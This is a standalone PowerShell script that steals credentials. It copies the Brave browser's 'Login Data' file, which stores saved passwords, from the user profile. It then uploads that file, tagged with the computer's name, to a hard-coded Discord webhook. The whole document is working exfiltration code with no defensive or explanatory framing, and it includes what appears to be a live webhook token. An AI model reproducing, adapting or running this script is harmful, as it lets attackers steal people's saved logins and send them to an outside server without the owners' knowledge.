$webhookUrl = "https://discord.com/api/webhooks/1374825778193236008/26E8HcYdvmSp3BaKLu_5O9rC5H_xOD9-Z4Pw_BDH1Ns-5cWZd-7WMTxab29tgK3e8B9E"
$originalPath = "$env:USERPROFILE\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Login Data"
$downloadsPath = "$env:USERPROFILE\Downloads"
$fileName = [System.IO.Path]::GetFileName($originalPath)
$copiedFilePath = Join-Path -Path $downloadsPath -ChildPath $fileName
Copy-Item -Path $originalPath -Destination $copiedFilePath -Force

$message = "**Login Data** of Brave Browser in [$env:COMPUTERNAME]"
$boundary = [System.Guid]::NewGuid().ToString()
$LF = "`r`n"

$body = New-Object System.IO.MemoryStream
$writer = New-Object System.IO.StreamWriter($body)

$writer.Write("--$boundary$LF")
$writer.Write("Content-Disposition: form-data; name=`"content`"$LF$LF")
$writer.Write("$message$LF")

$writer.Write("--$boundary$LF")
$writer.Write("Content-Disposition: form-data; name=`"file`"; filename=`"$fileName`"$LF")
$writer.Write("Content-Type: application/octet-stream$LF$LF")
$writer.Flush()

$fileBytes = [System.IO.File]::ReadAllBytes($copiedFilePath)
$body.Write($fileBytes, 0, $fileBytes.Length)

$writer.Write("$LF--$boundary--$LF")
$writer.Flush()
$body.Seek(0, 'Begin') | Out-Null

Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType "multipart/form-data; boundary=$boundary"

$writer.Dispose()
$body.Dispose()

# Optional: Clean up the copied file after upload
# Remove-Item $copiedFilePath -Force
